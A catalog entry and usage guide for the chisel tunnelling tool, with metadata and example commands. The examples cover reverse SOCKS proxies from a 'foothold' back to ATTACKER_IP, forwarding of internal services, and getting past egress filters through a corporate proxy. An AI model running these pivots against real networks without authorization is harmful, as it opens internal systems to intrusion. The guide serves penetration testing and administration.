---
name: "chisel"
categories:
  - blackarch-tunnel
version: "263.5ee6c74"
homepage: "https://github.com/jpillora/chisel"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2026-10-25"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "jpillora/chisel"
github-stars: 16742
github-pushed: "2026-10-11"
github-archived: false
github-issues: 249
github-match: "exact"
gh-checked: "2026-11-07"
worth: 7.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 19
gh-activity-checked: "2026-11-09"
---

# chisel

> TCP/UDP tunnelling packed into one static binary — tunnels are carried over HTTP and encrypted with SSH, and a single executable plays both the server and the client role.

## What it's for

Moving traffic across a network boundary that only allows outbound connections, or that hides internal services from you. The `server` role listens on a reachable host; the `client` role dials out and carries one or more tunnel definitions. It solves three recurring situations: a host can reach you but you cannot reach it (reverse tunnels), an internal-only service needs to be reachable from your machine (remote forwards), and arbitrary traffic needs to flow through a single foothold (SOCKS5 proxy). It is not a VPN: it forwards named ports and SOCKS rather than routing whole subnets, and its traffic looks like ordinary HTTP/websocket connections rather than being obfuscated further.

## Typical use cases

### Start a tunnel server that allows reverse tunnels

On the machine that will receive tunnels (usually your own):

```
chisel server --reverse --port 7000
```

Outcome: chisel listens on TCP 7000, prints its generated ECDSA key fingerprint, and logs one line per connecting client. `--reverse` is what permits clients to open listeners back on this machine; without it, clients can only open forwards on their own side. Add `-v` for verbose per-tunnel logging.

### Drop a reverse SOCKS proxy behind a restricted network

Run on the foothold host, which can reach you but is not reachable itself:

```
./chisel client http://ATTACKER_IP:7000 R:socks
```

Outcome: once the client connects out, the chisel server opens a SOCKS5 listener on its own `127.0.0.1:1080`. Any SOCKS-aware tool can now reach whatever the foothold can reach — pair it with `proxychains` (`socks5 127.0.0.1 1080` in `proxychains.conf`) so every chained tool egresses through the foothold, without declaring each port forward in advance. The client reconnects automatically if the connection drops.

### Open the reverse SOCKS listener on a chosen port

On the foothold host:

```
./chisel client http://ATTACKER_IP:7000 R:5000:socks
```

Outcome: same as `R:socks`, but the server's SOCKS5 listener lands on port 5000 instead of the default 1080 — useful when 1080 is already taken or you keep one dedicated port per pivot host.

### Pull an internal service out to your machine (remote port forward)

On the foothold host, which can reach the internal service:

```
./chisel client http://ATTACKER_IP:7000 R:3389:198.51.100.20:3389
```

Outcome: a listener opens on port 3389 on the server side. Connecting to `localhost:3389` on the server machine now lands on `198.51.100.20:3389` from the foothold's network position. The remote host defaults to the client's own `127.0.0.1`, so `R:6379:127.0.0.1:6379` exposes a service bound to the foothold's loopback.

### Bind a remote forward to a specific interface on the server

On the foothold host, using the full five-field reverse form:

```
./chisel client http://ATTACKER_IP:7000 R:127.0.0.1:8002:198.51.100.20:5432
```

Outcome: the new listener binds only to the server's loopback (`127.0.0.1:8002`) instead of all interfaces, and forwards to port 5432 on the internal host. Use this whenever the default all-interfaces bind would expose the forwarded service to other machines; the listener port and the target port may differ.

### Reach a service through the server (local forward)

On a host that can dial the server but cannot reach the destination itself:

```
chisel client http://ATTACKER_IP:7000 9999:127.0.0.1:80
```

Outcome: a listener opens on port 9999 on the client machine; traffic sent to it travels through the chisel server and exits from the server's network position toward `127.0.0.1:80`. This is the direction to use when the client sits in the restricted network and the server sits in the privileged one — the mirror image of the `R:` remotes.

### Pair a client-side SOCKS listener with proxychains

Server side (the internal SOCKS5 proxy must be switched on):

```
chisel server --socks5 --port 7000
```

Client side, on your own restricted machine:

```
chisel client http://ATTACKER_IP:7000 socks
```

Outcome: the client opens a SOCKS5 listener on its own `127.0.0.1:1080`; connections terminate at the server's internal SOCKS5 proxy and exit from the server's network position. Point `proxychains` at `socks5 127.0.0.1 1080` and every chained tool now egresses via the server — the opposite direction of `R:socks`.

### Require credentials on the tunnel

Server side:

```
chisel server --reverse --port 7000 --auth tunneluser:s3cret
```

Client side:

```
./chisel client --auth tunneluser:s3cret http://ATTACKER_IP:7000 R:socks
```

Outcome: clients without matching credentials are rejected during the SSH handshake. For multiple users, the server accepts `--authfile users.json` with per-user lists of allowed remote addresses (regular expressions, e.g. `^R:127\.0\.0\.1:1080$` to let an account act only as a reverse-SOCKS exit); the file is reloaded live.

### Pin the server's key against interception

```
./chisel client --fingerprint SERVER_FINGERPRINT http://ATTACKER_IP:7000 R:socks
```

Outcome: the client aborts unless the server presents exactly the given fingerprint (the server prints it on startup). This stops a stand-in server from silently terminating and capturing the tunnel.

### Tunnel out through an HTTP proxy on a restricted-egress network

On a host that may only egress via the corporate proxy:

```
./chisel client --proxy http://proxy.example.com:3128 http://ATTACKER_IP:7000 R:socks
```

Outcome: the client reaches the chisel server by CONNECT-ing through the named proxy (SOCKS works too: `socks5://proxy.example.com:1080`, credentials go URL-encoded in the URL), and the reverse tunnel opens as usual. The tunnel traffic to the server still looks like an ordinary HTTP/websocket session, which is what lets it pass egress filters that only allow web protocols.

*Corpus evidence: 290 mentions across 36 corpus entries with full command lines; examples above verified against upstream documentation.*
